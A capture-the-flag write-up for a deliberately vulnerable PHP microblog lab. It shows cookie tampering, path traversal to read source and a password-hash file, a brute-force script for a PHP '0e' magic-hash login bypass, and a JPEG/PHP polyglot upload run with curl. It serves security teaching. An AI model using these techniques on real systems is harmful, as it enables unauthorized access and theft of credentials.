# Thinkr

## The challenge

We are given access to a website, and the task is to exploit vulnerabilities in the website in order to gain unauthorized access to flags.

## Flag 1

When we visit the website, we are redirected to a login page. It's worth viewing the source of the page to see what it's doing, what resources it's pulling in, etc.

What you see when you view page source, is the first flag.

```html
<!doctype html>
<!-- flag{3nt3r-th3-m@tr1><} -->
<html>
```

Other than that, there is nothing really interesting in the source of the login page. Note that if you view source on any page of the site, you will see this flag.

## Flag 2

It's fairly clear that to get further, you need to log in to the site. You don't have an account, so this is hard. A helpful link at the bottom of the page suggests that there might be a way to sign up to the site. If you click it, you're redirected to a page which tells you the site is in beta, so you can't sign up. You need a referral link, or to make the site think you clicked a referall link. (You could also try to break the login form, but you've seen nothing at this point to suggest that it's breakable.)

If you inspect your cookies, you'll notice that there's a conspicuous `has_referral=0` cookie. If you try setting this to `1` and view the signup page again, you are no longer redirected. At the bottom of the page is another flag.

```
flag{nOm-n0M-t@st1e-c00K13}
```

## Flag 3

Once you make an account for the site, you are sent to a page of thoughts which people have recently had. Seems to be some kind of hipster microblogging platform. There are links at the top of the page which apparently let you think and personalize, but you can't access them because your account has not been approved by an admin yet. As this process takes 2-4 days, it's unlikely that you'll be able to access these pages before the end of the CTF. All you can do is view other people's thoughts. The thoughts are truncated on the main page, but clicking them takes you to a URL like `http://127.0.0.1/read.php?thought=354ecf76c94067c7135cbe6e8905727d`.

We know the application is vulnerable, because there are more flags to find. There's a few things which could be problematic with a URL like this. Maybe we can access thoughts we aren't meant to? There's no indication that there are non-public thoughts in this app though, so that seems unlikely. Also, it seems that the identifiers for thoughts are unpredictable, so enumeration is hard. Maybe the GET parameter there is SQL-injectable? Add an apostrophe to find out `http://127.0.0.1/read.php?thought=354ecf76c94067c7135cbe6e8905727d%27`. The result given is this:

```
Fatal error: Uncaught exception 'Exception' with message 'ID exceeds maximum length' in /var/www/html/storage/fsmodel.php:39 Stack trace: #0 /var/www/html/read.php(7): FSModel::load('354ecf76c94067c...') #1 {main} thrown in /var/www/html/storage/fsmodel.php on line 39
```

Not a SQL error, but definitely interesting. IDs for thoughts have a maximum length. Do they have a minimum length? Supply a one-character thought ID to find out. `http://127.0.0.1/read.php?thought=3`

```
Fatal error: Uncaught exception 'Exception' with message 'Could not find storage at /var/www/html/data/Thought/3' in /var/www/html/storage/fsmodel.php:45 Stack trace: #0 /var/www/html/read.php(7): FSModel::load('3') #1 {main} thrown in /var/www/html/storage/fsmodel.php on line 45
```

Very interesting. It seems the programmer has implemented their own filesystem-based database for this app. Seems like the kind of thing which could be breakable. There are several other important pieces of information this error message gives us:

* Thoughts are stored in `/var/www/html/data/Thought/`
* Thought IDs are appended to this path without much, if any, validation
* The PHP script being executed is at `/var/www/html/read.php`

Trying to read files in the `/data` directory unfortunately doesn't work.

Can we trick `read.php` into displaying it's own source? If we request `http://127.0.0.1/read.php?thought=../../read.php' we get the following (it's output as HTML, so I've reformatted it to have nice newlines and indentation).

```php
<?php
require('checks.php');
require_once('storage/thought.php');
require_once('storage/user_thought.php');
require_once('storage/user.php');
$thought = Thought::load($_GET['thought']);
$user = NULL;
$edge = array_values(UserThoughtEdge::withThought($thought->getField('id')))[0];
if ($edge != NULL) {
	$author = User::load($edge->getField('user'));
}
$title = $thought->getPreview(10);
require('_header.php');
?><h1>Thought by <?php echo $author ? $author->getField('id') : 'someone'; ?></h1>
<div id='thought'>
	<?php echo htmlspecialchars($thought->getField('data')); ?>
</div>
<?php require('_footer.php');
```

We also know the locations of other PHP files, and we can read them too. We can also request `http://127.0.0.1/storage/` to get a list of files which are used to represent data. We need to use our read.php exploit to read them though. So far we've been limited by the fact that our user hasn't been verified by an admin, so let's see if there's any way to make our user verified or to take over the account of another user. (Also, if you read `index.php` you'll see that a flag is dumped if the user who accesses the page is verfied). If we read `storage/user.php` we get this (again, reformatted):

```php
<?php
require_once('csvmodel.php');
require_once('util.php');
class User extends CSVModel {
	static function getFields() {
		return array("id", "salt", "hash", "verified", "photo");
	}

	private static function getHash($salt, $pw) {
		return md5($salt.$pw);
	}

	function setPassword($pw) {
		$salt = random_str(4);
		$this->setField('salt', $salt);
		$this->setField('hash', static::getHash($salt, $pw));
	}

	function checkPassword($pw) {
		$hash = static::getHash($this->getField('salt'), $pw);
		if ($hash == $this->getField('hash')) {
			return TRUE;
		} 
		return FALSE;
	}
}
```

(Those unfamiliar with modern PHP may be surprised to discover that it has classes and unsuprised to discover that they suck.)

There's a lot of interesting stuff here, but it's probably easier to work with this if we know how users are stored. There's no username field, so maybe a user's `id` is its username. (This is also confirmed if you read `read.php` carefully.) If we try to read `http://127.0.0.1/read.php?thought=../../data/User/<your_user>` we get another 'Could not find storage' error, so `User`s must be stored in a different format to `Thought`s. We can see that `User` extends `CSVModel`, so `CSVModel` might define how `User`s are stored. If we read `csvmodel.php` we get quite a lot of code, so I've just included the interesting parts:

```php
<?php
abstract class CSVModel extends Model {
   static function getStorage() {
      return "/var/www/html/data/".static::class.".csv";
   }

   .
   .
   .
}
```

You can read the rest of the class to figure out what format the data is in, or you can just read the file it's stored in. Request `http://127.0.0.1/read.php?thought=../User.csv` and you get

```
FLAG,,flag{[_[_t3LeP@thy-1ntEn5if13s_]_]},true,
ant,rnf9,4aa322be200aa5d1e2be915268d572e6,true,
bull,88rw,7676e66322af43795d3e30b623499e48,true,
cat,7bqa,cf52ee958dea0b0baafb539c4eaebb37,true,
dog,7n3g,45713d9403a6f9420b279453a4c2accd,true,
elephant,vunp,0e612198634316944013585621061115,true,
fox,jfx7,26025af32166cbb306a8c0dba4b4df00,true,
giraffe,oca1,8dd8558e45fd9dd1d5e66ccb36fb82d1,true,
hippo,te6z,272d1cc23b97f10eadd8074c1bb06eb0,true,
iguana,o2ak,48717c98395cc4b20a12ab543f874848,true,
jackelope,p5pw,f2a3fb8dd47df7b4aac9371fac5ca776,true,
koala,mlcb,68654ed2ff091ea8881fac855aa8de48,true,
lizard,eex0,5b2084f4266c31c15da9449da5e90d86,true,
monkey,y5nw,cbcca387e328939d8b50f8775ab39eb2,true,
numbat,032m,892f8b9ffc370594847979ad7234ddf7,true,
opossum,y8a2,42bf0fd88919f09f80b4fb6851b149d6,true,
possum,wwob,243318f3472c1947ced1e0912b53feac,true,
quail,p2m5,928995945cf0431c66fc6261444f50b2,true,
rattlesnake,3ekg,290c0e31881db7c7752824734ae4d801,true,
slug,qqtz,2bfa5d6ce5c5ddae3aa0de9c801b00f0,true,
tiger,pbfh,7419e828a2dfd1365a30bbd2fcb72ad7,true,
unicorn,wupu,1bfbc623dded215d13059694b519cb16,true,
viper,fdg7,6fb877ebdb34d454dd7fdc24a9c91d7d,true,
whale,mrkv,1f49dd35f92028b7ab22f8b4508e6133,true,
xerus,hfrc,9763331cbb5d28781dce64e1b8c8a4c1,true,
zebra,uk0q,77aeef2799d85ecd68c3f38d372335f0,true,
```

The top line contains a flag. This is as far as anyone got in the competion.

## Flag 4

There's been no indication that we can *create* an account and have that account verified. There's no code which even sets the `verified` field except `signup.php`. The admins must manually edit the CSV to verify users (No wonder it takes 2-4 days). There must be some issue that allows you to take over an account without knowing the password.

From `user.php`, we know that the passwords are MD5s with a 4-character salt. If you had enough time, you could probably simply crack one of them. You don't have enough time so you need to be smarter. Let's look at the method which checks the hashes.

```php
<?php
class User extends CSVModel {
	.
	.
	.
	function checkPassword($pw) {
		$hash = static::getHash($this->getField('salt'), $pw);
		if ($hash == $this->getField('hash')) {
			return TRUE;
		} 
		return FALSE;
	}
	.
	.
	.
}
```

PHP is a language with a lot of unexpected features. If you look at [the documentation for comparison operators](http://php.net/manual/en/language.operators.comparison.php) you'll see this:

|Example  | Name  | Result                                         |
|---------|-------|------------------------------------------------|
|$a == $b | Equal | TRUE if $a is equal to $b after type juggling. |

What is type juggling? The PHP documentation itself doesn't give a useful definition. Essentially, when using an operator on 2 variables, i.e. `$x + $y` or `$a == $b`, PHP will automatically convert the variables so that they are the same type. This seems like a reasonable idea at face value, though many would argue that type conversions should be more explicit. Where this becomes a problem is that PHP may convert the variables to a different type *even if they were already the same type*. In particular, if 2 strings are both formatted like numbers, PHP will convert them both to numbers, then compare those numbers. If the string looks like an integer, but is too large to be an integer, PHP will convert it to a float, then compare the floats. If the string only looks like a float, it will only convert it to a float.

Look again at the CSV of users. Does anything jump out at you? The user elephant has a password hash of `0e612198634316944013585621061115`. Interpreted as a float, this string evaluates to `0`. So does any string which starts with `0e` then a sequence of digits. An MD5 hex digest is 32 digits long. With some quick maths, we can determine that a particular MD5 digest has a `(1/16)^2 * (10/16)^30` chance of evaluating to 0. That's about 3 in 1 billion. That's easily brute-forceable. Here's a script which does it. It's randomised, which is a lazy way of making sure that if you run 8 instances of it at once, they don't do any duplicate work.

```python
import hashlib
import re
import string
import random

badhash = re.compile(r'^0e([0-9]*)$')

length = 10
pw_chars = string.ascii_lowercase + string.digits

def all_pw(lr):
   if lr == 0:
      yield ''
   else:
      shuffled = [c for c in pw_chars]
      random.shuffle(shuffled)
      for a in shuffled:
         for rp in all_pw(lr-1):
            yield a + rp

for pw in all_pw(length):
   h = hashlib.md5("vunp"+pw).hexdigest()
   if badhash.match(h):
      print pw
```

As soon as you find a password which matches, you can log in as elephant. Elephant's password was `sbmlv657w6ffc9gv`. Some example collisions are `rtvt3dj12u` and `1dxrw487z0`. When you log in, you are shown another flag.

## Flag 5

Becoming verified unlocks 2 new features. You can post your own thoughts and you can upload cool background photos so that your time spent posting is more awesome. From reading the code for posting thoughts, you can probably see that it's pretty solid (we have already exploited all of the bugs to get where we are, and it doesn't look like we can use them again). We know from the message associated with the previous flag that we need to gain access to the `flagsflagsflagsflagsflagsflagsflagsflags` directory. We can't use the file-reading exploit for this because the name of the directory is too long. Those who did well at this challenge during the competition may have noticed that config.php told you not to read from this directory, which was an error. To get the final flag you must read from this directory. Nobody got this far, so it fortunately was not a problem.

If you use the `read.php` exploit to read `photo.php`, you get this

```php
<?php require('checks.php');
require_once('storage/user.php');
require_once('storage/thought.php');
require_once('storage/user_thought.php');
$user = User::load($_SESSION['user']);
if (isset($_POST["submit"]) && $user->getField('verified') === 'true') {
	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_FILES["file"]["name"]);
	$uploadOk = 1;
	// Check if image file is a actual image or fake image
	$check = getimagesize($_FILES["file"]["tmp_name"]);
	if($check === false) {
		$uploadOk = 0;
	} 
	// Check if file already exists
	if (file_exists($target_file)) {
		$uploadOk = 0;
	}
	// Check file size
	if ($_FILES["file"]["size"] > 500000) {
		$uploadOk = 0;
	}
	if ($uploadOk == 1) {
		move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
		$user->setField('photo', $target_file);
		$user->save();
	}
}
$title = "Upload picture";
require('_header.php'); ?>
```

Some things to note:

* The code does not check or set the file extension.
* The code checks that the file is any kind of valid image

This means we can set our filename to end in `.php`, then the server will try to execute the uploaded file when we request it. For this to work, we need a file which is a valid image, and which also contains whatever payload we want. This actually isn't very hard. A JPEG can have arbitrary data appended to it and still be valid. A PHP file can have arbitrary data prepended to it and still be valid. We just need to write a script which dumps the flag and tack it onto the end of a JPEG file. Here's the PHP we want to execute:

```php
<?php
echo "\n".file_get_contents("../flagsflagsflagsflagsflagsflagsflagsflags/flag4")."\n";
?>
```

Here's the bash to create the payload:

```bash
$ cat image.jpg hax.php > pwn.php
```

Here's the bash to extract the flag

```bash
$ curl http://127.0.0.1/uploads/pwn.php 2> /dev/null | grep -a flag
```

